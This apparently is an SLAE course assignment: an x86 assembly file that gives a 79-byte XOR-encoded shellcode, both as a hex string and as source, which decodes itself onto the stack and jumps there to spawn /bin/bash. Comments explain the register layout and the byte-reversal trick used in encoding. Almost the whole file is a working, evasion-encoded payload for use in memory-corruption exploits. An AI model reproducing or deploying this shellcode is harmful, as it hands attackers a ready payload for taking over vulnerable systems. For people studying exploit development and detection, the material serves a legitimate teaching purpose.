;Description: 	XOR encoded STSB (shellcode to spawn bash :D) (79 bytes)
;Shellcode:	\xeb\x28\x5e\x31\xc9\xb1\x08\x31\xc0\x8a\x06\x34\xe4\x46\x8a\x26\x80\xf4\xe4\x46\xc1\xc0\x10\x8a\x06\x34\xe4\x46\x8a\x26\x80\xf4\xe4\xc1\xc0\x10\x50\x46\xe2\xdf\xff\xe4\xe8\xd3\xff\xff\xff\x54\xef\x29\x64\xb4\xb7\x6d\x05\xcb\xcb\x6d\x07\xcb\x8c\xcb\xcb\x8c\x86\x8d\x8a\x86\x85\x97\x8c\xb4\x6d\x06\x8c\x11\x11\xd5\x24
;Author: 	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID: 	526 

;The encoded shellcode will spawn /bin/bash

;The first thing to know is how registers are structured. Let's take eax as example:
;eax = eax(31-16)+ax(15-0) = eax(31-16)+ah(15-8)+al(7-0)
;
;The second thing to know is how to write the shellcode:
; 1) get the original encoded shellcode
; 2) reverse it
; 3) re-reverse it every 4 byte
;example:
; 1) 0x80,0xe2,0x11,0x4f,0x6d,0x05,0xcb,0x99 (original encoded shellcode)
; 2) 0x99,0xcb,0x05,0x6d,0x4f,0x11,0xe2,0x80 (reversed encoded shellcode)
; 3) 0x6d,0x05,0xcb,0x99,0x80,0xe3,0x11,0x4f ('re-reversed every 4 byte' reversed shellcode)
;This must be done because we read 4 byte at time and we push them onto the stack so:
; 1) bytes are pushed onto the stack in reverse order
; 2) we move 4 byte inside the register (so, for example, with the first cycle bytes 0x99cb056d are pushed onto the stack which is *wrong* because the correct order is 0x6d05cb99) so you can choose between a) change the shellcode to put byte in different order inside the register or b) write the shellcode in the order that i just explained. You choose :)

global _start
section .text
_start:
	jmp short call_me
do_me:
	pop esi
	xor ecx,ecx
	mov cl,8		;read 4 byte at time so 8 cycle are needed
main:
	xor eax,eax
	mov byte al,[esi]	;mov first byte inside al
	xor byte al,0xe4	;xor the first byte
	inc esi			;increment esi (next byte)
	mov byte ah,[esi]	;mov second byte inside ah
	xor byte ah,0xe4
	inc esi			;next byte
	rol eax,16		;rotate left 16 bit (eax-ah-al become ah-al-eax that is equal to (ah-al)-ah(eax)-al(eax)...
	mov byte al,[esi]	;...so i can repeat the move byte...
	xor byte al,0xe4
	inc esi
	mov byte ah,[esi]
	xor byte ah,0xe4
	rol eax,16		;...and then restoring the original structure :)
	push eax
	inc esi
	loop main
	jmp esp			;jmp to stack to execute the shellcode ;)

call_me:
	call do_me
	Shellcode: db 0x54,0xef,0x29,0x64,0xb4,0xb7,0x6d,0x05,0xcb,0xcb,0x6d,0x07,0xcb,0x8c,0xcb,0xcb,0x8c,0x86,0x8d,0x8a,0x86,0x85,0x97,0x8c,0xb4,0x6d,0x06,0x8c,0x11,0x11,0xd5,0x24
